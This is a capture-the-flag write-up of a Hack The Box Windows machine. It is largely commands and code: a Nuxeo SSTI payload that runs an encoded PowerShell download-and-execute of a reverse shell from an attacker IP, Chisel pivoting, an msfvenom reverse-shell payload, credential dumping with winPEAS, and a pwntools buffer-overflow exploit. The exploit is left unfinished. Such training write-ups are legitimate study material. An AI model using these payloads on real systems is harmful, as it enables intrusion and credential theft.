
**Skills Required**
Enumeration
Searching common vulnerabilities and publicly available exploits
Pivoting
Basic knowledge of binary exploitation techniques
**Skills Learned**
Techniques for bypassing Nginx rules
Decrypting Mozilla passwords
Socket reuse in binary exploitation

port 80 (http)
port 8000 (http)
port 9999 (netcat connection(app shell))

**I check the website whit whatweb**

```
❯ whatweb 10.10.11.115
http://10.10.11.115 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.21.0], IP[10.10.11.115], Title[Welcome to nginx!], nginx[1.21.0]

❯ whatweb 10.10.11.115:8000
http://10.10.11.115:8000 [200 OK] Country[RESERVED][ZZ], HTML5, HTTPServer[nginx/1.21.0], IP[10.10.11.115], JQuery, Open-Graph-Protocol[website], PHP[8.0.7], PasswordField[masterpassword], Script, Title[HashPass | Open Source Stateless Password Manager], X-Powered-By[PHP/8.0.7], nginx[1.21.0]
```

Whatweb shows information about the web in port 80, this website used nginx.
In port 8000 there are an aplication to create passwords

**In Port 9999 I used netcat to connect with that port and is an application that ask me for a Username and password.**

```
❯ netcat 10.10.11.115 9999
Welcome Brankas Application.
Username: test
Password: test
Username or Password incorrect
```

**This request asks for a password, but I don't have it, so I decide to fuzz the website using wfuzz**

```
❯ wfuzz -c --hc=404 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.115/FUZZ
"maintenance"
```

wfuzz finds a directory called "maintenence", which redirects me to another directory,  "nuxeo/maintenance".
So I intercept the request with burpsuite to examine what happens during that redirect

```
http://10.10.11.115/maintenance/
burpsuite
do intercept > response to this rquests
```

**I discover a JSESSIONID, which is related to Tomcat. It suggests there might be a reverse proxy with Nginx in the backgraund.
To abuse the reverse proxy I can use the "Breaking Parser Logic" payload (..;)**
https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf

**But first I'm going to fuzz for .jsp files**

```
❯ wfuzz -c --hc=404,502 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt http://10.10.11.115/maintenance/FUZZ.jsp
http://10.10.11.115/maintenance/index.jsp
```

**Now I'll check with a payload using the technique in the "Breaking Parser Logic" with wfuzz**
```
─❯ wfuzz -c --hc=404,502 -t 200 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt "http://10.10.11.115/maintenance/..;/FUZZ.jsp"; 
```

**I find a  "login" page, so I check that path on the website:**

```
http://10.10.11.115/maintenance/..;/login.jsp
```

**It's a Nuxeo login panel, I search for a exploit for Nuxeo and find CVE-2018-16341, which is a vulnerability allowing remote code execution without authentication using Server Side Template Injection (SSTI)** https://github.com/mpgn/CVE-2018-16341

**I use payloads from "payloadsallthethings" to check for suitable payloads:** https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#expression-language-el---code-execution

**Remote code execution and gain access to the system using Invoke-PowershellTCP.ps1**https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

``` bash
#On my machine, use powershell to download and execute the script On the victim machine
IEX(New-Object Net.WebClient).downloadString('10.10.14.4/invoke-powershell.ps1')

# To make this works, I need to encode it in base64
❯ echo "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.3/IP.ps1')" | iconv -t utf-16le | base64 -w 0; echo
SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwBJAFAALgBwAHMAMQAnACkACgA=

#put the encode string in the payload and execute
http://10.10.11.115/maintenance/..;/login.jsp/hola${"".getClass().forName("java.lang.Runtime").getMethods()[6].invoke("".getClass().forName("java.lang.Runtime")).exec("powershell -enc SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANAAuADMALwBJAFAALgBwAHMAMQAnACkACgA=")}.xhtml

#On my machine use python to serve as a server
sudo python -m http.server 80

# use netcat to gain the reverse shell
rlwrap nc -nlvp 1234
```

this way, I gain access to the victim machine, now I need to Escalate privilege.

**I use "netstat -ano" to find open internal ports on the vicitm machine,  and then I use powershell to check these ports**
https://adamtheautomator.com/netstat-port/

``` bash
Get-NetTCPConnection -State Listen | Select-Object -Property *,@{'Name' = 'ProcessName';'Expression'={(Get-Process -Id $_.OwningProcess).Name}} | FT -Property LocalAddress,LocalPort,ProcessName
``` 

I discover a "RemoteServerWin" process, which is an executable EXE file associated with the Unified Remote process,  To exploit this, I use a Python script from "searchsploit"

First, I need to gain acces to the port using Chisel:

```powershell
#On the victim machine
cd \ProgramData
certutil.exe -f -urlcache -split http://10.10.14.4/chisel.exe chisel.exe
./chisel client 10.10.14.4:1234 R:9512:127.0.0.1:9512 // or ./chisel client 10.10.14.4:1234 R:socks (to use all openports)

#On my machine
sudo python -m http.server 80
./chisel_linux server --reverse -p 1234
```

Now that the port is accessible from my side, I execute the exploit. But i need a payload first, which I create whit msfvenom

```powershell
#On my machine
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe -o rev.exe

rlwrap nc -nlvp 4444

sudo python -m http.server 80

❯ proxychains python2 unified-remote-rce.py  127.0.0.1 10.10.14.3 rev.exe
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/libproxychains4.so
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  127.0.0.1:9512  ...  OK
[+] Connecting to target...
[+] Popping Start Menu
[+] Opening CMD
[+] *Super Fast Hacker Typing*
[+] Downloading Payload
[+] Done! Check listener?
```

I gain access as the user *clara* user flag bf4e6392ae94159fba9de9c9b4102d2b

Now I need to escalate to Administrator.

I enumerate the system with winpeas
```powershell
#On my machine
sudo python -m http.server 80

#On the victim machine
certutil.exe -f -urlcache -split http://10.10.14.4/winpeas.exe winpeas.exe
.\winpeas.exe 
͹ Browsers Information 

͹ Showing saved credentials for Firefox
     Url:           http://localhost:8000
     Username:      hancliffe.htb
     Password:      #@H@ncLiff3D3velopm3ntM@st3rK3y*!
     
```

Winpeas find saved credentials for firefox, there are a url, username and password.
The url points to the password generator application seen earlier.
Using these credentials, I access the web application to obtain the real password for the user "development"

Since I already have the internal ports open with chisel, I try to connect using Evil-Winrm with these credentials

```powershell
proxychains evil-winrm -i 10.10.11.115 -u 'development' -p 'AMl.q2DHp?2.C/V0kNFU'
*Evil-WinRM* PS C:\Users\development\Documents> whoami
hancliffe\development
 ```

Now I gain access as the user "development"
In the "DevApp" directory, I find a binary and download it

```powershell
Evil-winrm PS > download MyFirstApp.exe
 ```

when I connect with netcat to port 9999 it requests credentials. 
This binary is related to that application.
I download the binary to my machine and use the "strings" tool to inspect it. I find a credencial in base64.
After analizing the binary with ghidra, it seemsm to implement some cipher. So, I need to decode the base64 credencial  and then decode it from atbash cipher to obtain the valid credential.

After logging in with these credencials via nectcat on port 9999, I find a buffer overflow vulnerability in the aplication

I'm going to use pwntools to create a script for the buffer overflow exploitation and use my local Windows machine to simulate the attack. I'll also use 32xdbg to debug the binary.

**I send the payload to trigger the buffer overflow**

``` python
#!/usr/bin/python3
from pwn import *

port = sys.argv[1]
payload = b"A"*800

r = remote('192.168.1.102', port)
r.recvuntil("Username:")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password:")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName:")
r.sendline(b"Vickry Alfiansyah")
r.recvuntil(b"Input Your Code:")
r.sendline(payload)


```

I used pattern_create.rb to get the EIP
``` bash
pattern_create.rb -l 800
 ```
 
``` python
#!/usr/bin/python3
from pwn import *

port = sys.argv[1]
payload = b"pattern_create output"

r = remote('192.168.1.102', port)
r.recvuntil("Username:")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password:")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName:")
r.sendline(b"Vickry Alfiansyah")
r.recvuntil(b"Input Your Code:")
r.sendline(payload)


```

Use pattern_offset.rb to get the offset
``` bash
pattern_create.rb -l 800 -q offset#
 ```

the offset is 66, now I verify if i get the control of the EIP

``` python
#!/usr/bin/python3
from pwn import *

port = sys.argv[1]
# payload = b"pattern_create output"
offset = 66
payload = b"A"*offset + b"B"*4 + b"C"*100


r = remote('192.168.1.102', port)
r.recvuntil("Username:")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password:")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName:")
r.sendline(b"Vickry Alfiansyah")
r.recvuntil(b"Input Your Code:")
r.sendline(payload)

```

checking de ESP I confirm that i don't have space to inject the shellcode, so I need that the EIP apoint to ESP, the idea is jump to a direccion that apply the jump to the ESP

``` python
# in x32dbg
right click > search in > shearch in all modules > command
jmp esp
7190239f (references)
f2 (breakpoint)

```

``` python
#!/usr/bin/python3
from pwn import *

port = sys.argv[1]
# payload = b"pattern_create output"
offset = 66
junk = b"A"*offset
jmp_esp = p32(0x7190239f)
payload = junk + jmp_esp

r = remote('192.168.1.102', port)
r.recvuntil("Username:")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password:")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName:")
r.sendline(b"Vickry Alfiansyah")
r.recvuntil(b"Input Your Code:")
r.sendline(payload)

```

I need to the eip apoint to the start of the string, creat an opcode that allowme go back with the instruction that i need execute

use nasm_shell
```
nasm_shell.rb
jmp $-70 (offset=66+jmp_esp=4)
EBB8
```

``` python
#!/usr/bin/python3
from pwn import *

port = sys.argv[1]
# payload = b"pattern_create output"
offset = 66
junk = b"A"*offset
jmp_esp = p32(0x7190239f)
jmp_esp70 = b"\xEB\xB8"
payload = junk + jmp_esp + jmp_esp70

r = remote('192.168.1.102', port)
r.recvuntil("Username:")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password:")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName:")
r.sendline(b"Vickry Alfiansyah")
r.recvuntil(b"Input Your Code:")
r.sendline(payload)

```

check if works with a test
``` python
#!/usr/bin/python3
from pwn import *

port = sys.argv[1]
# payload = b"pattern_create output"
test = b""
test += b"\xde\xad\xbe\xef"

offset = 66 -len(test)
junk = test + b"A"*offset
jmp_esp = p32(0x7190239f)
jmp_esp70 = b"\xEB\xB8"
payload = junk + jmp_esp + jmp_esp70

r = remote('192.168.1.102', port)
r.recvuntil("Username:")
r.sendline(b"alfiansyah")
r.recvuntil(b"Password:")
r.sendline(b"K3r4j@@nM4j@pAh!T")
r.recvuntil(b"FullName:")
r.sendline(b"Vickry Alfiansyah")
r.recvuntil(b"Input Your Code:")
r.sendline(payload)

```

now I need to use socket reused

I need EAX be equal to ESP 
*My maind exploit in this point*

